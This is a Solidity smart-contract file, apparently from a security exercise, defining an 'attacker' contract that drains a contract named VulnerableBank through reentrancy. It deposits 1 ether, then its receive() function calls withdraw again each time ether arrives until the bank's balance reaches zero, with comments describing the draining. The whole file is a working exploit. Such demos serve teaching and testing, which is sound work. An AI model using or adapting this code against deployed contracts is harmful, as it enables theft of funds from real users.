
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./bc.sol";

contract attacker{
VulnerableBank public bank; //target contract

constructor(address _bank){
bank = VulnerableBank(_bank);
}

function attack()public payable{
bank.deposit{value: 1 ether}();
bank.withdraw(1 ether);
}



receive() external payable { //runs automatically when ETH is received untill bank is drain
if (address(bank).balance > 0 ) { //checks if ether is available greater than 0
bank.withdraw(1 ether); //calls withdrawn function,withdraw 1 ether from vulnerableBank(reentrancy)
}
}

}
